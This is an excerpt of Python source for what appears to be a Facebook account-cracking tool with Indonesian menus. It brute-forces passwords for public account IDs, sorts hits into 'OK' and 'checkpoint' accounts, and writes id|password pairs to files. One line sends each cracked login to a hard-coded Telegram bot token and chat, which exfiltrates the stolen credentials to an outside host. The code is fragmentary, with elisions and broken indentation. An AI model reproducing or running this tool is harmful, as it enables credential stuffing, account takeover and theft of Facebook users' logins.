...
def MRMRBX():
	try:
		os.system('clear')
		banner()
		your_cookies = input('\033[0m [\x1b[1;96mEnter\033[0m] Cookie :  ')
				...
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					...
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						...
						if 'Sukses!' in str(response6):
							...
							print("")
							os.system("python MRBXMRBX.py")
							print("python MRBXCRACK");MRBX()
			except Exception as e:
...
def menu(my_name,my_id):
	...
	os.system('clear')
	banner()
	print('[1] CRACK ID PUPLIC/MULITY \033[33m[ \033[32mVIP \033[33m ] ')
	print('')
	print('[2] CRACK ID PUBLIC \033[33m[ \033[32mBEST \033[33m ] ')
	print('')
	print('\x1b[1;92m[03] CRACK FILE \033[33m[ \033[32mVIP \033[33m ] ')
	print('')
...
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	print(f'\033[1;97m [\033[32m01\033[97m]  OLD CLONE')
	print(f'\033[1;97m [\033[32m02\033[97m]  NEW CLONE')
	print(f'\033[1;97m [\033[32m03\033[97m]  ID NEW+OLD')
	hu = input('\n\033[33m[ ! ] Choose : ')
	if hu in ['1','01']:
		...
		back()
	print('')
	print(' \x1b[1;91m[\x1b[1;92m 1 \x1b[1;91m] METHOD B-API = ')
	hc = input('\n\033[33m[➣_] Chouse : ')
	if hc in ['1','01']:
   ...
   "scheme": 'https',
    ...
    'viewport-width': '980',}
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{K}[+] MR,VEAR-ID CP {idf} {K}[+] CP {pw}')     
				...
				print(f'\r\x1b[32m[Successful] {idf} | {pw}')
				open('OK/'+okc,'a').write('\n'+idf+'|'+pw)
				cek_apk()
				break
...
def crackfree(idf,pwv):
   ...
   "scheme": 'https',
    ...
    'viewport-width': '980',}
			...
			if "MRBX checkpoint" in po.cookies.get_dict().keys():
...
def cracktouch(idf,pwv):
	...
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	sys.stdout.write('\rMR,VEAR¬¬ OK:%s ¬ CP:%s  %s%s%s '%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
...
def crackmbasic(idf,pwv):
   ...
   "scheme": 'https',
    ...
    'viewport-width': '980',}
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{x}MR,VEAR-CP{k} {idf}|{pw}{N}')     
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
				...
				if 'no' in taplikasi:
					...
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					requests.get(f"https://api.telegram.org/bot6397039003:AAHBnBkd7vG8eZGES1ZdLkPOUHR2r0NfGoY/sendMessage?chat_id=@Dr_Sn0w&text=MRBX-OK  {idf} | {pw} ")	
					print(f'\r{h} [+] MR,VEAR-OK  {idf} [+] PASS {pw}')
